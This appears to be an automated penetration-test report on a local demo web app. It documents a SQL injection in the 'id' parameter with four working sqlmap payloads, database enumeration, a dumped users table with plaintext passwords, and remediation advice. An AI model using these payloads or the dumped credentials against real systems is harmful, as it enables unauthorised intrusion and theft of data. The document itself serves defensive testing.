# SQL Injection DAST Assessment Report

**Target:** http://web.dev.local:8083  
**Date:** 2026-04-21T07:03:05 UTC  
**Tester:** Offensive Security Agent (Automated SQLi DAST)  
**Tool:** sqlmap 1.10.2#stable  

---

## Executive Summary

A critical **SQL Injection** vulnerability was identified on the target web application at `http://web.dev.local:8083`. The application exposes a user search form with a GET parameter `id` that is directly interpolated into a SQL query without proper sanitization. Full exploitation was achieved, resulting in complete database compromise including extraction of all user credentials. The database server runs as `root@%`, granting maximum privilege access.

**Risk Rating: CRITICAL**

---

## Analyzed Vectors

| # | Endpoint | Method | Parameter | Tested |
|---|----------|--------|-----------|--------|
| 1 | `http://web.dev.local:8083/` | GET | `id` | ✅ |
| 2 | `http://web.dev.local:8083/` | GET | `Submit` | ✅ |

### Reconnaissance Findings

The homepage presents a "Search user" form:
- **Form method:** GET
- **Action:** `#` (self)
- **Input field:** `id` (User ID text input)
- **Submit parameter:** `Submit`

A test request `/?id=1&Submit=Submit` returned:
```
ID: 1
First name: John
Surname: Doe
```

This confirmed user data is retrieved from a database based on the `id` parameter.

**Server Stack (from sqlmap fingerprinting):**
- OS: Linux Debian
- Web Server: Apache 2.4.65
- Language: PHP 8.1.33
- Database: MySQL >= 5.1 (MariaDB fork)

---

## Findings

### VULN-001 — SQL Injection in `id` Parameter (CRITICAL)

| Field | Detail |
|-------|--------|
| **URL** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **Parameter** | `id` (GET) |
| **DBMS** | MySQL >= 5.1 (MariaDB) |
| **DB User** | `root@%` |
| **Injection Types** | Boolean-based blind, Error-based, Time-based blind, UNION query |

#### Confirmed Injection Payloads

**1. Boolean-Based Blind**
```
id=1' OR NOT 8214=8214-- AqsF
```
- Title: OR boolean-based blind - WHERE or HAVING clause (NOT)

**2. Error-Based (EXTRACTVALUE)**
```
id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,0x716b787a71,(SELECT (ELT(7830=7830,1))),0x71766a7071))-- vHQx
```
- Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)

**3. Time-Based Blind (SLEEP)**
```
id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt
```
- Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

**4. UNION Query (2 columns)**
```
id=1' UNION ALL SELECT CONCAT(0x716b787a71,0x767a62745947437465636a7152757275674f6351784a5a7151546f5375627a746162546c74536443,0x71766a7071),NULL-- -
```
- Title: Generic UNION query (NULL) - 2 columns

---

## Exploitation Evidence

### Available Databases

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Tables in `sqli_demo`

```
+-------+
| users |
+-------+
```

### Dumped Data: `sqli_demo.users`

Full table contents extracted via UNION-based injection:

```
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

**8 user records extracted**, including plaintext passwords.  
The `admin` account (user_id=1) uses password `password123`.

### Privilege Note

The database connection runs as **`root@%`** — the highest privilege MySQL user with unrestricted remote access. This means an attacker could also:
- Read/write arbitrary files on the server (`LOAD_FILE`, `INTO OUTFILE`)
- Access all other databases (`mysql.user`, system tables)
- Potentially achieve OS-level code execution via `--os-shell`

---

## Conclusion

The target application at `http://web.dev.local:8083` is **critically vulnerable** to SQL Injection via the `id` GET parameter. The vulnerability allows:

1. **Full database enumeration** — all databases and tables were listed
2. **Complete data exfiltration** — all 8 user records with plaintext credentials were extracted
3. **Privilege escalation risk** — the DB runs as `root`, enabling file system access and potential RCE

### Remediation Recommendations

| Priority | Action |
|----------|--------|
| 🔴 Critical | Use **parameterized queries / prepared statements** for all DB queries |
| 🔴 Critical | **Never store passwords in plaintext** — use bcrypt/argon2 hashing |
| 🟠 High | Apply **least-privilege** to the DB user (not `root`) |
| 🟠 High | Implement **input validation** and allowlist for `id` (numeric only) |
| 🟡 Medium | Deploy a **WAF** to detect and block SQLi patterns |
| 🟡 Medium | Enable **error suppression** in production to hide DB error messages |

---

*Report generated automatically by Offensive Security Agent on 2026-04-21T07:03:05 UTC*
